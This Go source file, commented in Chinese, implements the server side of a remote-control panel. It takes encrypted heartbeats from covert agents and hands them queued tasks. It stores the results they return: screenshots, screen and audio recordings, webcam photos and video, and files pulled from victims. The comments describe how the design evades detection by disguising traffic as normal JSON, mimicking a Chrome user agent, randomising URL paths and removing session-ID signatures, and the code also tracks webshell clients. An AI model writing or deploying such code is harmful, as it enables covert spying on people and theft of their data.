package main

import (
	"context"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// ============ Agent 通信端点 ============
// 三个端点: /agent/heartbeat, /agent/pull, /agent/result
// 通信协议: 加密 base64 请求/响应体，算法标识隐入 body 信封（_a 字段）
// 流量伪装: 无自定义 HTTP 头，Content-Type 伪装为 application/json，UA 模拟真实 Chrome
// 路径随机化: /api/v1/* 通配符路由，动作类型隐入 body 信封 _op 字段，路径无固定特征

// handleAgentDispatch 通配符路由分发器
// 从解密后的 body 中取 _op 字段（heartbeat/pull/result），分发到对应 handler
// 路径后缀（如 /api/v1/abc123def456）被忽略，仅作伪装
func handleAgentDispatch(w http.ResponseWriter, r *http.Request) {
	data, err := decryptRequestData(r)
	if err != nil {
		writeEncryptedError(w, r, 400)
		return
	}
	op, _ := data["_op"].(string)
	// 从 body 移除 _op 字段，避免干扰下游处理
	delete(data, "_op")
	switch op {
	case "heartbeat":
		handleAgentHeartbeatDecrypted(w, r, data)
	case "pull":
		handleAgentPullDecrypted(w, r, data)
	case "result":
		handleAgentResultDecrypted(w, r, data)
	default:
		// 未知操作，返回加密错误（不泄露明文）
		writeEncryptedError(w, r, 404)
	}
}

// getRequestAlgo 从请求 body 信封获取加密算法标识（不再用 HTTP 头，避免流量特征）
// 信封格式: {"_a":"aes-128-cbc","_d":"<加密数据>"}，_a=algo, _d=data
// 兼容旧模式: 无 _a 字段时按全局算法或 none 处理
func getRequestAlgo(r *http.Request) string {
	return getGlobalAlgo()
}

// getGlobalAlgo 获取全局配置的加密算法
func getGlobalAlgo() string {
	algo := getSettingDefault("traffic_encryption", "none")
	if algo == "aes" {
		algo = "aes-128-cbc"
	}
	return algo
}

// detectedAlgoCtxKey context key 用于存储请求解密时命中的算法
type detectedAlgoCtxKey struct{}

// decryptRequestData 解密 Agent 请求体
// 新协议: body 是纯 base64(IV+密文)，无 JSON 外壳
// 服务端自动判断算法: 遍历所有支持的算法尝试解密，命中后存入 request context
// 响应时用相同算法加密（确保客户端能解密）
func decryptRequestData(r *http.Request) (map[string]interface{}, error) {
	body, err := io.ReadAll(r.Body)
	if err != nil {
		return nil, fmt.Errorf("read body failed: %w", err)
	}
	raw := strings.TrimSpace(string(body))
	if raw == "" {
		return map[string]interface{}{}, nil
	}

	// 兼容旧信封格式 {"_a":"...","_d":"...","_op":"..."}
	if strings.HasPrefix(raw, "{") {
		var envelope map[string]interface{}
		if jErr := json.Unmarshal([]byte(raw), &envelope); jErr == nil {
			if algo, ok := envelope["_a"].(string); ok {
				encData, _ := envelope["_d"].(string)
				op, _ := envelope["_op"].(string)
				if encData == "" {
					m := map[string]interface{}{}
					if op != "" {
						m["_op"] = op
					}
					return m, nil
				}
				if algo == "none" || algo == "" {
					decoded, err := base64.StdEncoding.DecodeString(encData)
					if err == nil {
						var m map[string]interface{}
						if json.Unmarshal(decoded, &m) == nil {
							if op != "" {
								m["_op"] = op
							}
							return m, nil
						}
					}
					return map[string]interface{}{}, nil
				}
				decrypted, err := encDecrypt(encData, algo, getEncPassword())
				if err != nil {
					return nil, fmt.Errorf("decrypt failed")
				}
				var m map[string]interface{}
				if err := json.Unmarshal(decrypted, &m); err != nil {
					return nil, fmt.Errorf("json parse failed")
				}
				if op != "" {
					m["_op"] = op
				}
				return m, nil
			}
			return envelope, nil
		}
	}

	// 新协议: body 是纯 base64(IV+密文)，无算法标识
	// 遍历所有算法尝试解密，命中后存入 context 供响应加密使用
	pw := getEncPassword()
	globalAlgo := getGlobalAlgo()

	tryAlgos := []string{globalAlgo}
	allAlgos := []string{"aes-128-cbc", "aes-256-cbc", "rc4", "chacha20", "xor", "none"}
	for _, a := range allAlgos {
		if a != globalAlgo {
			tryAlgos = append(tryAlgos, a)
		}
	}

	for _, algo := range tryAlgos {
		decrypted, err := encDecrypt(raw, algo, pw)
		if err != nil {
			continue
		}
		var m map[string]interface{}
		if json.Unmarshal(decrypted, &m) == nil {
			// 验证是否包含合理字段（避免误判）
			if _, ok := m["_op"]; ok {
				setDetectedAlgo(r, algo)
				return m, nil
			}
			if _, ok := m["client_id"]; ok {
				setDetectedAlgo(r, algo)
				return m, nil
			}
			if len(m) > 0 {
				setDetectedAlgo(r, algo)
				return m, nil
			}
		}
	}

	var m map[string]interface{}
	if json.Unmarshal([]byte(raw), &m) == nil {
		return m, nil
	}
	return map[string]interface{}{}, nil
}

// setDetectedAlgo 存储命中的算法到 request context
func setDetectedAlgo(r *http.Request, algo string) {
	ctx := r.Context()
	*r = *r.WithContext(context.WithValue(ctx, detectedAlgoCtxKey{}, algo))
}

// getDetectedAlgo 从 request context 获取命中的算法，未设置则返回全局算法
func getDetectedAlgo(r *http.Request) string {
	if v, ok := r.Context().Value(detectedAlgoCtxKey{}).(string); ok && v != "" {
		return v
	}
	return getGlobalAlgo()
}

// encryptResponseData 加密响应数据
// 用请求解密时命中的算法加密（确保客户端能解密），未命中则用全局算法
func encryptResponseData(r *http.Request, data interface{}) (string, string) {
	algo := getDetectedAlgo(r)
	if algo == "" {
		algo = "none"
	}

	if algo == "none" {
		j, _ := json.Marshal(data)
		return base64.StdEncoding.EncodeToString(j), "none"
	}

	encrypted, _, err := encEncrypt(data, algo, getEncPassword())
	if err != nil {
		j, _ := json.Marshal(data)
		return base64.StdEncoding.EncodeToString(j), "none"
	}
	return encrypted, algo
}

// writeEncryptedResponse 写入加密响应（纯密文 body，伪装为普通文本接口）
func writeEncryptedResponse(w http.ResponseWriter, r *http.Request, data interface{}) {
	encStr, _ := encryptResponseData(r, data)
	// Content-Type 用 text/plain，body 是纯 base64 密文，无 JSON 结构特征
	w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	w.WriteHeader(http.StatusOK)
	w.Write([]byte(encStr))
}

// writeEncryptedError 写入加密错误响应（错误也走加密通道，不泄露明文错误信息）
func writeEncryptedError(w http.ResponseWriter, r *http.Request, code int) {
	writeEncryptedResponse(w, r, map[string]interface{}{"_err": code})
}

// ============ /agent/heartbeat（与 app.py agent_heartbeat 对齐）============

func handleAgentHeartbeat(w http.ResponseWriter, r *http.Request) {
	data, err := decryptRequestData(r)
	if err != nil {
		writeEncryptedError(w, r, 400)
		return
	}
	handleAgentHeartbeatDecrypted(w, r, data)
}

// handleAgentHeartbeatDecrypted 处理已解密的心跳数据（供 dispatch 和旧路径共用）
func handleAgentHeartbeatDecrypted(w http.ResponseWriter, r *http.Request, data map[string]interface{}) {
	clientID := getString(data, "client_id", "")
	if clientID == "" {
		writeEncryptedError(w, r, 400)
		return
	}

	ip := getRequestIP(r)
	existing, _ := queryOne("SELECT * FROM clients WHERE client_id=?", clientID)

	var sessID string
	if existing != nil {
		sessID = getString(existing, "session_id", "")
		if sessID == "" {
			sessID = genSessionID(clientID)
		}
		dbExec(`UPDATE clients SET
			status='online', last_seen=?,
			hostname=?, os=?, os_version=?, arch=?, username=?, ip=?,
			session_id=?, session_state='active'
			WHERE client_id=?`,
			nowLocal(), getString(data, "hostname", ""), getString(data, "os", ""),
			getString(data, "os_version", ""), getString(data, "arch", ""),
			getString(data, "username", ""), ip, sessID, clientID)
	} else {
		sessID = genSessionID(clientID)
		dbExec(`INSERT INTO clients
			(client_id, hostname, os, os_version, arch, username, ip, status, group_name,
			 session_id, session_state, session_started, client_type)
			VALUES (?, ?, ?, ?, ?, ?, ?, 'online', 'default', ?, 'active', ?, 'agent')`,
			clientID, getString(data, "hostname", ""), getString(data, "os", ""),
			getString(data, "os_version", ""), getString(data, "arch", ""),
			getString(data, "username", ""), ip, sessID, nowLocal())
		addLog("client", fmt.Sprintf("新客户端上线: %s (session: %s)", clientID, sessID), clientID, 0, ip)
	}

	broadcastClientUpdate()

	writeEncryptedResponse(w, r, map[string]interface{}{
		"status":     "ok",
		"client_id":  clientID,
		"session_id": sessID,
	})
}

// ============ /agent/pull（与 app.py agent_pull 对齐）============

func handleAgentPull(w http.ResponseWriter, r *http.Request) {
	data, err := decryptRequestData(r)
	if err != nil {
		writeEncryptedError(w, r, 400)
		return
	}
	handleAgentPullDecrypted(w, r, data)
}

// handleAgentPullDecrypted 处理已解密的拉取请求（供 dispatch 和旧路径共用）
func handleAgentPullDecrypted(w http.ResponseWriter, r *http.Request, data map[string]interface{}) {
	clientID := getString(data, "client_id", "")

	// 更新在线状态
	dbExec("UPDATE clients SET status='online', last_seen=? WHERE client_id=?", nowLocal(), clientID)

	// 查询 pending 任务
	tasks, _ := queryAll("SELECT * FROM tasks WHERE client_id=? AND status='pending' ORDER BY created_at", clientID)

	taskList := []map[string]interface{}{}
	for _, task := range tasks {
		taskID := getInt(task, "id", 0)
		// 标记为 processing
		dbExec("UPDATE tasks SET status='processing' WHERE id=?", taskID)

		// 解析 task_data
		var taskData interface{} = map[string]interface{}{}
		taskDataStr := getString(task, "task_data", "")
		if taskDataStr != "" {
			var td interface{}
			if err := json.Unmarshal([]byte(taskDataStr), &td); err == nil {
				taskData = td
			}
		}

		taskList = append(taskList, map[string]interface{}{
			"id":        taskID,
			"task_type": getString(task, "task_type", ""),
			"task_data": taskData,
		})
	}

	writeEncryptedResponse(w, r, map[string]interface{}{"tasks": taskList})
}

// ============ /agent/result（与 app.py agent_result 对齐）============

func handleAgentResult(w http.ResponseWriter, r *http.Request) {
	data, err := decryptRequestData(r)
	if err != nil {
		writeEncryptedError(w, r, 400)
		return
	}
	handleAgentResultDecrypted(w, r, data)
}

// handleAgentResultDecrypted 处理已解密的结果回传（供 dispatch 和旧路径共用）
func handleAgentResultDecrypted(w http.ResponseWriter, r *http.Request, data map[string]interface{}) {
	taskID := getInt(data, "task_id", 0)
	result := getString(data, "result", "")
	status := getString(data, "status", "completed")
	if status == "" {
		status = "completed"
	}

	task, _ := queryOne("SELECT * FROM tasks WHERE id=?", taskID)
	if task == nil {
		writeEncryptedError(w, r, 404)
		return
	}

	taskType := getString(task, "task_type", "")
	clientID := getString(task, "client_id", "")

	// 资源类型任务：将 base64 数据保存为文件
	resourceTypes := map[string]bool{
		"screenshot": true, "record_screen": true, "record_audio": true,
		"camera_photo": true, "camera_record": true, "file_download": true,
	}

	var dbResult string
	if resourceTypes[taskType] && result != "" && !strings.HasPrefix(result, "[ERROR]") && len(result) > 500 {
		dbResult = saveResourceFile(taskType, clientID, taskID, result)
	} else {
		// 普通任务: 截断到 50000 字符
		if len(result) > 50000 {
			result = result[:50000]
		}
		dbResult = result
	}

	dbExec("UPDATE tasks SET status=?, result=?, completed_at=? WHERE id=?",
		status, dbResult, nowLocal(), taskID)
	dbExec("UPDATE clients SET last_seen=?, status='online' WHERE client_id=?", nowLocal(), clientID)

	broadcastTaskUpdate()

	writeEncryptedResponse(w, r, map[string]interface{}{"status": "ok"})
}

// saveResourceFile 保存资源文件到 tmp 目录，返回 JSON 路径引用
// 与 app.py agent_result 中的资源保存逻辑对齐
func saveResourceFile(taskType, clientID string, taskID int64, result string) string {
	extMap := map[string][2]string{
		"screenshot":    {"screenshots", "jpg"},
		"record_screen": {"recordings", "avi"},
		"record_audio":  {"audio", "wav"},
		"camera_photo":  {"screenshots", "jpg"},
		"camera_record": {"recordings", "avi"},
		"file_download": {"downloads", "bin"},
	}
	subdir, ext := "downloads", "bin"
	if v, ok := extMap[taskType]; ok {
		subdir, ext = v[0], v[1]
	}

	// file_download 返回 JSON: {"filename":"xxx","data":"base64..."}
	var raw []byte
	origFilename := ""
	if taskType == "file_download" {
		var dlData struct {
			Filename string `json:"filename"`
			Data     string `json:"data"`
		}
		if err := json.Unmarshal([]byte(result), &dlData); err == nil {
			origFilename = dlData.Filename
			raw, _ = base64.StdEncoding.DecodeString(dlData.Data)
		}
	} else {
		raw, _ = base64.StdEncoding.DecodeString(result)
	}

	if raw == nil {
		if len(result) > 5000 {
			return result[:5000]
		}
		return result
	}

	// 保留原始文件扩展名
	if origFilename != "" && strings.Contains(origFilename, ".") {
		parts := strings.Split(origFilename, ".")
		ext = strings.ToLower(parts[len(parts)-1])
	}

	// 安全文件名
	safeOrig := sanitizeFilename(origFilename)
	filename := fmt.Sprintf("%s_%d_%d%s.%s", clientID, taskID, time.Now().Unix(), safeOrig, ext)
	if safeOrig == "" {
		filename = fmt.Sprintf("%s_%d_%d.%s", clientID, taskID, time.Now().Unix(), ext)
	}

	tmpDir := getTmpDir()
	resDir := filepath.Join(tmpDir, subdir)
	os.MkdirAll(resDir, 0755)

	filePath := filepath.Join(resDir, filename)
	if err := os.WriteFile(filePath, raw, 0644); err != nil {
		return result[:5000]
	}

	dbResult, _ := json.Marshal(map[string]interface{}{
		"type":     "file",
		"path":     fmt.Sprintf("/api/resource/%s/%s", subdir, filename),
		"size":     len(raw),
		"filename": origFilename,
	})
	return string(dbResult)
}

// sanitizeFilename 清理文件名（只保留字母数字和 ._-，最多 50 字符）
func sanitizeFilename(name string) string {
	var sb strings.Builder
	for _, c := range name {
		if (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '.' || c == '_' || c == '-' {
			sb.WriteRune(c)
		}
	}
	result := sb.String()
	if len(result) > 50 {
		result = result[:50]
	}
	return result
}

// getTmpDir 获取临时文件目录
func getTmpDir() string {
	return filepath.Join(serverDir, "tmp")
}

// genSessionID 生成无固定前缀的 session_id（去除 S-/SH-/WS- 等特征性前缀）
// 格式: 16 字符 hex（md5(clientID + timestamp + random)[:16]），与 client_id 格式一致，不易区分
func genSessionID(clientID string) string {
	h := md5.Sum([]byte(clientID + strconv.FormatInt(time.Now().UnixNano(), 10) + strconv.Itoa(rand.Intn(99999))))
	return hex.EncodeToString(h[:])[:16]
}

// ============ 离线检测（与 app.py check_offline_clients 对齐）============

// startOfflineChecker 启动离线检测 goroutine
func startOfflineChecker() {
	go func() {
		for {
			time.Sleep(10 * time.Second)
			// WebShell / Shell 类型不按心跳判定离线
			// Shell 类型由 shellReadLoop 的 defer 负责标记 offline，不依赖心跳
			// nowLocal() 返回北京时间字符串，与 last_seen 存储格式一致
			threshold := time.Now().In(getBeijingLoc()).Add(-30 * time.Second).Format("2006-01-02 15:04:05")
			dbExec("UPDATE clients SET status='offline' WHERE last_seen < ? AND status='online' AND (client_type NOT IN ('webshell','shell') OR client_type IS NULL)", threshold)
			broadcastClientUpdate()
		}
	}()
}
